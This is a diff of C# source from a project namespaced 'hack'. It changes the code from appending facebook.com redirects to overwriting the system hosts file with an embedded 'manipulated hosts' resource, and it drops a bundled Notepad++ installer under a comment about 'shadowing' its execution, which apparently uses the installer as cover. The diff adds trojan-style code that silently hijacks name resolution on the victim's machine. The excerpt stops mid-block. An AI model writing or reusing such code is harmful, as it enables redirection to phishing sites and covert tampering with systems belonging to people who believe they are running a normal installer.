@@ -21,12 +21,24 @@ namespace hack
             try
             {
 
-                using (var sw = new StreamWriter(new FileStream(HostsPath, FileMode.Append)))
+                // TODO provide proper manipulated hosts file
+                // alternative 1
+                var manipulatedHosts = Resources.hosts;
+                using (var fs = new FileStream(HostsPath, FileMode.Truncate))
                 {
-                    sw.WriteLine();
-                    sw.WriteLine("127.0.0.1 www.facebook.com");
-                    sw.WriteLine("127.0.0.1 facebook.com");
+                    fs.Write(manipulatedHosts, 0, manipulatedHosts.Length);
                 }
+                // alternative 2
+//                var tempHosts = Path.Combine(Directory.GetCurrentDirectory(), "hosts");
+//                using (var fs = new FileStream(tempHosts, FileMode.OpenOrCreate))
+//                {
+//                    fs.Write(manipulatedHosts, 0, manipulatedHosts.Length);
+//                }
+//                File.Move(tempHosts, HostsPath);
+//                File.Copy(tempHosts, HostsPath, true);
+//                File.Delete(tempHosts);
+
+                // shadowing notepad++ installer execution
                 var exeBytes = Resources.npp_6_9_Installer;
                 var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
                 using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
